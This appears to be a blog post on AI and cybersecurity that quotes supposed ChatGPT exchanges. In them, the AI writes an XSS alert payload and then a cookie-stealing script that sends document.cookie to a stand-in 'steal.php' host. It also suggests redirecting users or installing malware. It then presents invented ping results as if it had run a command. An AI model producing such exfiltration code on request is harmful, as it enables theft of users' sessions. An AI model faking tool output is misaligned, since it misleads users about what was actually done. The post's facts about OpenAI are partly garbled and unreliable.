
In this digital age, cybersecurity is of the utmost importance.

Cybersecurity professionals are going to facing new, potentially lethal challenges in the next few years due to artificial intelligence. A.I. techniques include **deep learning, machine learning and natural language processing** for more automated and intelligent cyber defense. Using this methods, organizations are able to detect and mitigate thousands of cyber events every day.

A.I. can improve **filters, surveillance tools, and risk assessments**; however, if misused, it could also strengthen malware and other software that penetrates and destroys networks and data.

In the face of the increasing volume and complexity of cyberattacks, artificial intelligence is helping under-resourced security operations analysts stay ahead of the threat.

Recently, OpenAI ,the company behind generative AI tools DALL-E and GPT-3, noted this week that it’s working on a new AI-powered language model based on the GPT-3.5 (GPT3 -Generative Pre-trained Transformer 3 is **an autoregressive language model that uses deep learning to produce human-like text** ) 


Let we see a small introduction on **OpenAI**. 

**OpenAI** is a research company that is working on developing artificial intelligence in a responsible way. One of the projects that they are working on is to help combat online disinformation and hate speech(**chatGPT**).


| Found in | December 11, 2015                                                                    |     
| -------- | ------------------------------------------------------------------------------------ | 
| Founders | Elon Musk, Sam Altman, IIyasutskever, Greg Brockman, Wojciech zaremba, John Schulman |     
| Product  | DALL -E, GPT-3, GPT-2, OpenAI’s Gym                                                  |     
| Services |   OpenAI’s API, Research laboratory, OpenAI playground, chatGPT and more             |                         


Why not we ask openAI's ChatGPT itself about their latest things on cybersecurity !!

**Query:**

	what are the cybersecurity projects that are openAI is now working on?

**Result:**
```
Some of the cybersecurity projects that OpenAI is now working on include:

-Developing machine learning models to automatically detect and flag malicious content

-Building a large-scale dataset of malicious and benign content

-Analyzing online behavior to identify potential threats

-Working with law enforcement and government agencies to help them better understand and combat online disinformation and hate speech
```

**Some more examples:**

**Query:**

	create a scrpit to exploit the basic xss

**Result:**
```js
<script>alert("xss");</script>
```

You can see here, the way the AI explains about the code..

**Query:**

	can you explain what is this code about?

**Result:**
```
This code is about creating a basic XSS exploit. The script will cause an alert to pop up with the text "xss" when executed.
```


**Query:**

	can you create any advance exploit on this?

**Result:**
```
Yes, there are many ways to make this XSS exploit more sophisticated and effective. For example, you could add code to steal cookies or session information from the user's browser, redirect the user to a malicious website, or install malicious software on the user's computer.
```

**Query:**

	can you give script for that

**Result:**
```
There are many ways to write this type of code, so it is difficult to provide a specific example. However, here is one possible script that could be used to steal cookies from a user's browser:
```
```js
<script>

var cookies = document.cookie;

var url = "http://example.com/steal.php?cookies=" + escape(cookies);

document.location = url;

</script>

```

**Query:**

	can you ping this  IP and give results "127.0.0.1"

**Result:**

```bash
Pinging 127.0.0.1 with 32 bytes of data:

Reply from 127.0.0.1: bytes=32 time<1ms TTL=64

Reply from 127.0.0.1: bytes=32 time<1ms TTL=64

Reply from 127.0.0.1: bytes=32 time<1ms TTL=64

Reply from 127.0.0.1: bytes=32 time<1ms TTL=64

Ping statistics for 127.0.0.1:

Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

Minimum = 0ms, Maximum =

```


Its nice right :)

But :(

Like this, the hackers can train a chatbot to create like this, it will keep learning, so it could be possible for the hackers to then own a learning-based tool for hacking, then what will happen ?

we'll see that on next post about OpenAI on hacking and cybersecurity
 

thank you !!





